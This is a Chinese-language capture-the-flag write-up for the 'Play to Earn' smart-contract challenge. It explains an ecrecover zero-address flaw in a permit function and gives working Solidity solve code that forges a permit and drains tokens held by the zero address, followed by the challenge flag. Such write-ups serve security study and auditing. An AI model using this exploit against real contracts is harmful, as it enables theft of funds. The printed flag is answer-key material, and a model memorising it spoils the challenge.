# Play to Earn

## 题目简述

题目部署了一套可充值、提现并支持 EIP-712 `permit` 的 `Coin` 合约，以及会把代币转入零地址的 `ArcadeMachine`。初始化时，`Setup` 向 `Coin` 充值 $20$ ETH，再让街机消费其中 $19$ ETH，因此 `balanceOf[address(0)]` 中实际保存着可兑回 ETH 的 $19$ 枚代币。玩家注册后只获得少量代币，而通关条件要求玩家地址的原生 ETH 余额至少达到 $13.37$ ETH。

关键的 `permit` 校验如下：

```solidity
address signer = ecrecover(h, v, r, s);
require(signer == owner, "invalid signer");
allowance[owner][spender] = value;
```

合约没有拒绝 `owner == address(0)`，也没有检查 `ecrecover` 的返回值是否为零地址。

## 解题过程

### 关键观察

EVM 的 `ecrecover` 在签名参数非法时不会主动回滚，而是返回 `address(0)`。因此把 `owner` 也设为零地址，再提供一组无效签名，就能满足 `signer == owner`，为玩家设置从零地址转账的 allowance。

零地址的内部代币余额来自初始化时的街机消费：

```solidity
coin.deposit{value: 20 ether}();
coin.approve(address(arcadeMachine), 19 ether);
arcadeMachine.play(19);
```

而 `play` 最终执行：

```solidity
coin.transferFrom(msg.sender, address(0), 1 ether * times);
```

所以攻击步骤为：

1. 调用 `Setup.register()` 登记玩家地址。
2. 以零地址为 `owner`、玩家为 `spender`，用无效签名调用 `permit`。
3. 调用 `transferFrom(address(0), player, 19 ether)`，取走零地址的代币余额。
4. 调用 `withdraw` 把代币按 $1:1$ 兑回 ETH。

核心求解代码如下：

```solidity
setup.register();

coin.permit(
    address(0),
    user,
    19 ether,
    block.timestamp + 1 days,
    0,
    bytes32(0),
    bytes32(0)
);

coin.transferFrom(address(0), user, 19 ether);
coin.withdraw(coin.balanceOf(user));
require(setup.isSolved());
```

调用完成后，玩家得到约 $19$ ETH，超过通关阈值。

仓库中比赛环境的 `FLAG` 配置为：

```text
SEKAI{0wn3r:wh3r3_4r3_mY_c01n5_:<}
```

## 方法总结

- 核心技巧：利用 `ecrecover` 失败返回零地址的语义，伪造 `owner == address(0)` 的 `permit`。
- 识别信号：签名校验只比较 `ecrecover(...) == owner`，却没有同时拒绝零地址；业务逻辑又允许零地址拥有余额或权限。
- 复用要点：审计 ECDSA 恢复逻辑时，应同时检查签名规范性、恢复结果非零以及业务层是否允许零地址成为主体。零地址在 ERC-20 语义中常被当作销毁地址，但自定义记账合约未必真的销毁其余额。
